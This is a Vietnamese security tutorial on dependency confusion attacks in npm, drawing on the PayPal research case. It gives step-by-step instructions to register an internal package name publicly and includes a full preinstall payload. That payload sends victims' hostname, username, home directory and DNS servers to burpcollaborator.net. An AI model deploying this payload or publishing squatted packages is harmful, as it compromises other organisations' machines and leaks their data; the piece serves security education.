> Bài viết này được dịch và viết theo ý hiểu của người viết thông qua nhiều nguồn

Kể từ khi bạn mới học code Python, bạn có sử dụng mấy package rất tiện lợi install trên `pip` không

```bash
pip install <package_name>
```

Như mình thì mình cứ thế install, không cần biết là package đó có đủ tin tưởng hay không, cũng chẳng thèm đọc source của cái package đó nữa, cứ install được việc của mình đã :D, đến khi mình đọc được cái bài viết [này](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610), thì mình vẫn cứ tin tưởng package đó thôi, vẫn chẳng mảy may suy nghĩ gì :frowning: 

Một số ngôn ngữ lập trình (như Python, nodejs, Ruby, ...), đi kèm với một phương pháp cực kỳ dễ dàng để cài đặt package cho các project của bạn. Những package này thường nằm trên các repositories public, nơi bất kỳ ai cũng có thể tự do tải lên các package cho người khác sử dụng.

- Python có `pip` https://pypi.org/
- Node có `npm` https://www.npmjs.com/package
- RubyGem có `gem` https://rubygems.org/

Cách cài đặt cực kỳ dễ dàng, như mình đã nói ở trên, chỉ cần sử dụng câu lệnh `npm install <package_name>` là có thể kéo code từ registry public trên https://www.npmjs.com/package về để bạn sử dụng rồi.

Ơ vậy thì khi tải xuống và sử dụng một package từ bất kỳ nguồn nào trong số này, về cơ bản bạn đang tin tưởng tác giả của nó để chạy code trên máy của bạn. Vì vậy, sự tin tưởng mù quáng này có thể bị khai thác bởi những người có ý đồ xấu hay không?

![image.png](https://images.viblo.asia/04bca92f-2b99-458d-bd39-0cd80df05ac2.png)

Tất nhiên là có thể

Không có package hosting services nào có thể đảm bảo rằng tất cả code mà người dùng tải lên đều không có phần mềm độc hại. [Nghiên cứu trước đây](https://incolumitas.com/2016/06/08/typosquatting-package-managers/) đã chỉ ra rằng **typosquatting** - một cuộc tấn công tận dụng các phiên bản typo'd của các tên package phổ biến - có thể cực kỳ hiệu quả trong việc truy cập vào các PC ngẫu nhiên trên toàn thế giới.

# Ideal
Trong bài phân tích hack Paypal vào năm  2020, Justin Gardner (@Rhynorater) và Alex Birsan (@alex.birsan) đã chia sẻ một chút thú vị về source code nodejs được tìm thấy trên GitHub của Paypal.

Code Paypal sử dụng nội bộ, và bất giờ trong file `package.json` (là một file chứa tên các dependencies, sử dụng để install packages cho nhanh) của nó, dường như chứa một sự pha trộn của các public và private dependencies - các package công khai từ NPM, cũng như các gói được phát triển private (internal) - có thể được phát hành nội bộ bởi Paypal.   
Những cái tên này không tồn tại trên public npm registry vào thời điểm đó.

![image.png](https://images.viblo.asia/6221a157-71bb-427a-b21f-bc532c6a2ac0.png)

Vậy thì ý tưởng được đặt ra là, nếu mình tạo 1 package với tên giống với package mà Paypal code riêng thì sao, sau đó public lên registry của npm, vậy thì điều gì sẽ xảy ra. 

- Điều gì sẽ xảy ra nếu mã độc được tải lên NPM dưới những cái tên này? Có thể một số project nội bộ của PayPal thay vì kéo từ private registry lại thực hiện kéo code từ public registry, sau đó thực thi code độc hại đó :o 
- Các nhà phát triển, hoặc thậm chí các hệ thống tự động, sẽ bắt đầu chạy code bên trong các thư viện?
- Nếu điều này hoạt động, chúng ta có thể nhận được một khoản bug bounty từ nó?
- Liệu cuộc tấn công này cũng có tác dụng chống lại các công ty khác?

# Thử nghiệm
> Ở đây mình ví dụ với npm, các package khác tương tự, tuỳ theo spec của các ngôn ngữ đó

Đầu tiên các bạn cần đọc được nội dung của file `package.json` của project đó (có thể public trên github, trang web cho phép đọc file `package.json`,...), sau đó bạn có thể kiểm tra toàn bộ package trong project đó hiện tại có public trên npm hay không, bằng cách search tên package đó trên https://www.npmjs.com/, hoặc cũng có thể sử dụng công cụ https://github.com/visma-prodsec/confused cho nhanh cũng được

![image.png](https://images.viblo.asia/8bcd1cdf-1795-494f-b5e0-d3ef95f6bc7d.png)

Phát hiện ra package `spr-svg-loaders` không có trên public registry của npmjs

## Creating Malicious Packages (NPM)
Thực hiện đăng ký package `spr-svg-loaders` lên public NPM registry

- Cài đặt `npm`
    ```bash
    sudo apt install npm
    ```
- Đăng ký account tại https://www.npmjs.com/signup
- Login account npm với lệnh
    ```bash
    npm login
    ```
    ![image.png](https://images.viblo.asia/9e28e962-bcf4-4027-9aca-6b29912c8e3e.png)
- Tạo folder `spr-svg-loaders`
- Tạo NPM package
    ```bash
    cd spr-svg-loaders
    npm init
    ```
    Ở đây các bạn cứ ấn enter thôi, thích điền thông tin nào vào cũng được
- Chỉnh sửa lại file package.json  
    ![image.png](https://images.viblo.asia/af63e695-ccc2-43c6-938e-31302e099dd6.png)  
    NPM hỗ trợ preinstall, điều này giúp cho ai kéo package này về đều thực thi lệnh `node index.js` 
- Tạo file `index.js` với nội dung
    ```js:index.js
    //author:- whitehacker003@protonmail.com
    const os = require("os");
    const dns = require("dns");
    const querystring = require("querystring");
    const https = require("https");
    const packageJSON = require("./package.json");
    const package = packageJSON.name;

    const trackingData = JSON.stringify({
        p: package,
        c: __dirname,
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: dns.getServers(),
        r: packageJSON ? packageJSON.___resolved : undefined,
        v: packageJSON.version,
        pjson: packageJSON,
    });

    var postData = querystring.stringify({
        msg: trackingData,
    });

    var options = {
        hostname: "burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
        },
    };

    var req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        // console.error(e);
    });

    req.write(postData);
    req.end();
    ```
- Xong phần code, bây giờ chỉ cần public package này lên public registry npmjs là xong
    ```bash
    npm publish
    ```
    ![image.png](https://images.viblo.asia/dc30dd00-cd18-49fe-91e0-0157da184721.png)  
    Nó sẽ tương tự thế này, nếu bạn nào gặp lỗi 403, thì có thể bạn đang publish version thấp hơn, hoặc bạn không có quyền với cái package đó.   
    Thành công thì bạn sẽ nhận được 1 cái tương tự thế này https://www.npmjs.com/package/spr-svg-loaders
## Kết quả
![image.png](https://images.viblo.asia/d715ce32-80cb-4e3a-8e40-eece7e41d7ee.png)

Ngồi chờ 1 lát là thấy có máy kéo package này về, bạn có thể xem thông tin như hostname, full path, username, ... Vậy bạn có thể RCE đến máy mà install cái package này rồi :cold_sweat: 

Theo Alex Birsan, anh ấy đã scan và lấy được hàng trăm package private không có trên public registry, và anh ấy thử nghiệm tấn công và tỷ lệ thành công đáng kinh ngạc. 
> Đọc thêm tại : https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610

# Nguyên nhân
Vậy nguyên nhân từ đâu mà ra, có thể cần tới bài viết nữa để có thể tìm nguyên nhân sâu ra gốc rễ của vấn đề này, hẹn các bạn vào bài thứ 2. See you :blush: 

# Tham khảo
- https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/
- https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013